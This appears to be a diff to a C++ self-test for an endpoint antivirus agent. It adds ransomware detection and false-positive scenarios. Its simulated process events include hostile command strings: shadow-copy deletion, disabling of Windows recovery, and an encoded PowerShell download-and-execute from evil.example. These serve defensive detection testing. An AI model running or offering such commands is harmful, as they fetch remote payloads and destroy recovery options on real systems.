@@ -977,14 +977,72 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
         broker.SetPolicy(phase2Policy);
         broker.SetDeviceId(L"self-test-device");
 
-        const auto runBurstScenario = [&broker](const std::filesystem::path& root,
-                                                const std::wstring& processImage,
-                                                const std::wstring& parentImage,
-                                                const std::wstring& commandLine,
-                                                const std::wstring& userSid,
-                                                const char* payload,
-                                                const std::vector<std::wstring>& extensions,
-                                                const bool includeEncryptedExtensions) {
+        struct Phase2BurstScenarioResult {
+          bool blocked{false};
+          int blockedCount{0};
+          std::vector<std::wstring> reasonCodes;
+          std::wstring details;
+        };
+
+        const auto joinReasonCodes = [](const std::vector<std::wstring>& reasonCodes) {
+          if (reasonCodes.empty()) {
+            return std::wstring(L"none");
+          }
+
+          std::wstring joined;
+          for (std::size_t index = 0; index < reasonCodes.size(); ++index) {
+            if (index != 0) {
+              joined += L", ";
+            }
+            joined += reasonCodes[index];
+          }
+          return joined;
+        };
+
+        const auto hasReasonCodePrefix = [](const Phase2BurstScenarioResult& result, const std::wstring& prefix) {
+          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
+                             [&prefix](const auto& code) { return code.starts_with(prefix); });
+        };
+
+        const auto hasReasonCode = [](const Phase2BurstScenarioResult& result, const std::wstring& code) {
+          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
+                             [&code](const auto& candidate) { return candidate == code; });
+        };
+
+        const auto observeBehaviorEvent = [&broker](const EventKind kind,
+                                                    const std::wstring& correlationId,
+                                                    const std::wstring& targetPath,
+                                                    const std::wstring& processImage,
+                                                    const std::wstring& parentImage,
+                                                    const std::wstring& commandLine,
+                                                    const std::wstring& userSid) {
+          broker.ObserveBehaviorEvent(EventEnvelope{
+              .kind = kind,
+              .deviceId = L"self-test-device",
+              .correlationId = correlationId,
+              .targetPath = targetPath,
+              .sha256 = {},
+              .process =
+                  ProcessContext{
+                      .imagePath = processImage,
+                      .commandLine = commandLine,
+                      .parentImagePath = parentImage,
+                      .userSid = userSid,
+                      .signer = {}},
+              .occurredAt = std::chrono::system_clock::now(),
+          });
+        };
+
+        const auto runBurstScenario = [&broker, &joinReasonCodes](const std::filesystem::path& root,
+                                                                  const std::wstring& correlationId,
+                                                                  const std::wstring& processImage,
+                                                                  const std::wstring& parentImage,
+                                                                  const std::wstring& commandLine,
+                                                                  const std::wstring& userSid,
+                                                                  const char* payload,
+                                                                  const std::vector<std::wstring>& extensions,
+                                                                  const bool includeEncryptedExtensions,
+                                                                  const std::size_t encryptedExtensionStartIndex = 24) {
           std::vector<std::filesystem::path> stagedPaths;
           const std::vector<std::wstring> directories = {L"documents", L"desktop", L"downloads", L"pictures", L"projects"};
           constexpr std::size_t kSampleCount = 40;
@@ -992,22 +1050,22 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
           for (std::size_t index = 0; index < kSampleCount; ++index) {
             const auto directoryName = directories[index % directories.size()];
             std::wstring extension = extensions[index % extensions.size()];
-            if (includeEncryptedExtensions && index >= 24) {
+            if (includeEncryptedExtensions && index >= encryptedExtensionStartIndex) {
               extension = (index % 2 == 0) ? L".locked" : L".encrypted";
             }
 
             const auto stagedPath = root / directoryName / (L"phase2-file-" + std::to_wstring(index + 1) + extension);
             if (!WriteSelfTestSample(stagedPath, payload)) {
-              return std::tuple<bool, bool, int, std::wstring>(false, false, 0,
-                                                                L"Failed to stage " + stagedPath.wstring() + L".");
+              return Phase2BurstScenarioResult{
+                  .blocked = false,
+                  .blockedCount = 0,
+                  .reasonCodes = {},
+                  .details = L"Failed to stage " + stagedPath.wstring() + L"."};
             }
             stagedPaths.push_back(stagedPath);
           }
 
-          bool blocked = false;
-          bool ransomwareReason = false;
-          int blockedCount = 0;
-          std::wstring details;
+          Phase2BurstScenarioResult result{};
           for (std::size_t index = 0; index < stagedPaths.size(); ++index) {
             const auto& stagedPath = stagedPaths[index];
             std::error_code absolutePathError;
@@ -1032,7 +1090,7 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
               request.fileSizeBytes = 0;
             }
 
-            CopyWideField(request.correlationId, L"self-test-phase2-burst");
+            CopyWideField(request.correlationId, correlationId);
             CopyWideField(request.path, resolvedPath.wstring());
             CopyWideField(request.processImage, processImage);
             CopyWideField(request.parentImage, parentImage);
@@ -1043,25 +1101,27 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
             if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ||
                 outcome.finding.verdict.disposition == VerdictDisposition::Block ||
                 outcome.finding.verdict.disposition == VerdictDisposition::Quarantine) {
-              ++blockedCount;
-              blocked = true;
-              if (FindingHasReasonPrefix(outcome.finding, L"REALTIME_RANSOMWARE_")) {
-                ransomwareReason = true;
+              ++result.blockedCount;
+              result.blocked = true;
+              for (const auto& reason : outcome.finding.verdict.reasons) {
+                result.reasonCodes.push_back(reason.code);
               }
-              details = L"Blocked " + resolvedPath.wstring() + L" with reason " + FirstReasonCode(outcome.finding) + L".";
+              result.details = L"Blocked " + resolvedPath.wstring() + L" with reasons [" +
+                               joinReasonCodes(result.reasonCodes) + L"].";
               break;
             }
           }
 
-          if (details.empty()) {
-            details = L"No block was observed across staged write-churn simulation files.";
+          if (result.details.empty()) {
+            result.details = L"No block was observed across staged write-churn simulation files.";
           }
 
-          return std::tuple<bool, bool, int, std::wstring>(blocked, ransomwareReason, blockedCount, details);
+          return result;
         };
 
         const auto maliciousScenario = runBurstScenario(
             phaseValidationRoot / L"phase2-ransomware-burst",
+            L"self-test-phase2-ransomware-burst",
             L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             L"C:\\Windows\\explorer.exe",
             L"powershell.exe -NoProfile -Command \"vssadmin delete shadows /all /quiet; $aes = New-Object System.Security.Cryptography.AesManaged\"",
@@ -1070,20 +1130,83 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
             {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
             true);
 
-        if (std::get<0>(maliciousScenario) && std::get<1>(maliciousScenario)) {
+        if (maliciousScenario.blocked && hasReasonCodePrefix(maliciousScenario, L"REALTIME_RANSOMWARE_")) {
           AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                    SelfTestStatus::Pass,
-                   L"Realtime write-churn simulation triggered ransomware behavior containment. " + std::get<3>(maliciousScenario));
+                   L"Realtime write-churn simulation triggered ransomware behavior containment. " + maliciousScenario.details);
         } else {
           AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                    SelfTestStatus::Fail,
                    L"Realtime write-churn simulation did not trigger expected ransomware behavior blocking. " +
-                       std::get<3>(maliciousScenario),
+                       maliciousScenario.details,
                    L"Tune Phase 2 behavior-chain scoring for destructive write bursts and pre-impact commands.");
+        }
+
+        const auto extensionBurstScenario = runBurstScenario(
+            phaseValidationRoot / L"phase2-ransomware-extension-burst",
+            L"self-test-phase2-extension-burst",
+            L"C:\\Windows\\System32\\wscript.exe",
+            L"C:\\Windows\\System32\\cmd.exe",
+            L"wscript.exe //B //NoLogo rotate.js",
+            L"S-1-5-21-1000",
+            kPhase2RansomwareBurstSample,
+            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
+            true,
+            12);
+
+        if (extensionBurstScenario.blocked &&
+            hasReasonCode(extensionBurstScenario, L"REALTIME_RANSOMWARE_EXTENSION_BURST")) {
+          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
+                   SelfTestStatus::Pass,
+                   L"Encrypted-extension burst simulation triggered ransomware extension-burst containment. " +
+                       extensionBurstScenario.details);
+        } else {
+          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
+                   SelfTestStatus::Fail,
+                   L"Encrypted-extension burst simulation did not trigger the expected extension-burst reason path. " +
+                       extensionBurstScenario.details,
+                   L"Raise confidence on burst rename and encrypted-extension clustering without relying on extension lists alone.");
+        }
+
+        observeBehaviorEvent(
+            EventKind::ProcessStart, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\Downloads\\invoice.docx.exe",
+            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            L"powershell.exe -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==; iwr https://evil.example/payload.ps1; iex $env:TEMP\\payload.ps1",
+            L"S-1-5-21-1000");
+        observeBehaviorEvent(
+            EventKind::ScriptScan, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
+            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            L"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
+            L"S-1-5-21-1000");
+
+        const auto stagedImpactScenario = runBurstScenario(
+            phaseValidationRoot / L"phase2-ransomware-staged-impact",
+            L"self-test-phase2-staged-impact",
+            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            L"powershell.exe -NoProfile -Command \"bcdedit /set {default} recoveryenabled no; reagentc /disable; $aes = New-Object System.Security.Cryptography.AesManaged\"",
+            L"S-1-5-21-1000",
+            kPhase2RansomwareBurstSample,
+            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
+            false);
+
+        if (stagedImpactScenario.blocked &&
+            hasReasonCode(stagedImpactScenario, L"REALTIME_CHAIN_RANSOMWARE_IMPACT")) {
+          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
+                   SelfTestStatus::Pass,
+                   L"Fenrir correlated scripted staging with recovery-inhibition impact behavior before mass encryption. " +
+                       stagedImpactScenario.details);
+        } else {
+          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
+                   SelfTestStatus::Fail,
+                   L"Fenrir did not correlate staged script activity with later impact behavior strongly enough. " +
+                       stagedImpactScenario.details,
+                   L"Strengthen process-lineage correlation so staging, scripting, and recovery inhibition combine into rapid containment.");
         }
 
         const auto benignScenario = runBurstScenario(
             phaseValidationRoot / L"phase2-benign-bulk-io",
+            L"self-test-phase2-benign-bulk-io",
             L"C:\\Program Files\\BackupSuite\\backup-agent.exe",
             L"C:\\Windows\\System32\\services.exe",
             L"backup-agent.exe --sync --incremental --verify",
@@ -1092,7 +1215,7 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
             {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
             false);
 
-        if (!std::get<0>(benignScenario)) {
+        if (!benignScenario.blocked) {
           AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                    L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Pass,
                    L"Benign backup-style bulk write simulation stayed allow-only across staged files.");
@@ -1100,17 +1223,77 @@ SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::pat
           AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                    L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                    L"Benign backup-style bulk write simulation triggered blocking unexpectedly. " +
-                       std::get<3>(benignScenario),
+                       benignScenario.details,
                    L"Adjust benign bulk-I/O dampening so backup, sync, and migration workloads avoid ransomware false positives.");
+        }
+
+        const auto photoExportScenario = runBurstScenario(
+            phaseValidationRoot / L"phase2-benign-photo-export",
+            L"self-test-phase2-benign-photo-export",
+            L"C:\\Program Files\\FFmpeg\\bin\\ffmpeg.exe",
+            L"C:\\Windows\\explorer.exe",
+            L"ffmpeg.exe -i C:\\Users\\Public\\Videos\\input.mov -vf scale=1920:1080 C:\\Users\\Public\\Pictures\\export-%03d.jpg",
+            L"S-1-5-21-3000",
+            kPhase2BenignBulkIoSample,
+            {L".jpg", L".png", L".json", L".txt", L".csv", L".jpeg"},
+            false);
+
+        if (!photoExportScenario.blocked) {
+          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
+                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Pass,
+                   L"Benign photo/video export write churn stayed allow-only across staged files.");
+        } else {
+          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
+                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
+                   L"Benign photo/video export simulation triggered blocking unexpectedly. " +
+                       photoExportScenario.details,
+                   L"Retain dampening for trusted media export tooling while preserving destructive-write detection.");
+        }
+
+        const auto developerBuildScenario = runBurstScenario(
+            phaseValidationRoot / L"phase2-benign-developer-build",
+            L"self-test-phase2-benign-developer-build",
+            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\MSBuild.exe",
+            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Common7\\IDE\\devenv.exe",
+            L"MSBuild.exe Fenrir.sln /t:Build /p:Configuration=Release /m",
+            L"S-1-5-21-4000",
+            kPhase2BenignBulkIoSample,
+            {L".obj", L".pdb", L".lib", L".tlog", L".cache", L".ilk"},
+            false);
+
+        if (!developerBuildScenario.blocked) {
+          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
+                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Pass,
+                   L"Benign developer build churn stayed allow-only across staged files.");
+        } else {
+          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
+                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
+                   L"Benign developer build simulation triggered blocking unexpectedly. " +
+                       developerBuildScenario.details,
+                   L"Prevent broad cross-directory churn heuristics from tripping on normal build output workflows.");
         }
       }
     } catch (const std::exception& error) {
       AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                SelfTestStatus::Fail, L"Phase 2 ransomware behavior simulation failed: " + Utf8ToWide(error.what()),
                L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
+      AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
+               SelfTestStatus::Fail, L"Phase 2 ransomware extension-burst simulation failed: " + Utf8ToWide(error.what()),
+               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
+      AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
+               SelfTestStatus::Fail, L"Phase 2 staged-impact correlation simulation failed: " + Utf8ToWide(error.what()),
+               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
       AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                L"Phase 2 benign bulk-I/O simulation failed: " + Utf8ToWide(error.what()),
+               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
+      AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
+               L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
+               L"Phase 2 benign photo/video export simulation failed: " + Utf8ToWide(error.what()),
+               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
+      AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
+               L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
+               L"Phase 2 developer build simulation failed: " + Utf8ToWide(error.what()),
                L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
     }
 
